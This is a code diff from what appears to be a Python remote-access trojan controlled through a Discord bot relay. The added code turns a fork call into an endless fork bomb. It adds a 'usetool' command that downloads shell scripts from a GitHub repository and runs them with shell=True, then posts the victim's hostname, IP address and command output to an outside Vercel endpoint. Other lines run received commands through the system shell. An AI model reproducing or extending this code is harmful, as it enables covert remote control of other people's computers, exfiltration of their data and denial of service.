@@ -76,12 +76,39 @@ while True:
                         for _ in range(command[1]):
                             fork()
                     else:
-                        fork()
+                        while 1:
+                            fork()
+                elif command.startswith('usetool'):
+                    localcmd = command.split()
+                    if localcmd[1<len(localcmd)]:
+                        try:
+                            exescript = get(f"https://github.com/littleblack111/remote-control-tools/raw/main/{localcmd[1]}").content.decode()
+                            if localcmd[1].endswith(".sh"):
+                                r = system(exescript, shell=True, stdout=PIPE, stderr=PIPE)
+                                cmdout, cmderr = r.communicate()
+                                try:
+                                    post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```{cmdout.decode()}```")
+                                except:
+                                    try:
+                                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```Failed to sent output of usetool```")
+                                    except KeyboardInterrupt:
+                                        continue
+                                    continue
+                        except KeyboardInterrupt:
+                            try:
+                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) while changing directory``")
+                            except KeyboardInterrupt:
+                                continue
+                            continue
+                        except Exception as e:
+                            try:
+                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Failed to get script{e}``")
+                            except KeyboardInterrupt:
+                                continue
+                            continue
+                        old_command = command
+                        continue
 
-                
-                    
-                
-#                if command.startswith("ping"):
 #                    try:
 #                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: Pong!")
 #                    except KeyboardInterrupt:
@@ -108,7 +135,7 @@ while True:
                         continue
                 old_command = command
                 if localcmd:
-                    r = system(command, shell=True, stdout=PIPE, stderr=PIPE)
+                    r = system(localcmd, shell=True, stdout=PIPE, stderr=PIPE)
                     cmdout, cmderr = r.communicate()
                 else:
                     r = system(command, shell=True, stdout=PIPE, stderr=PIPE)
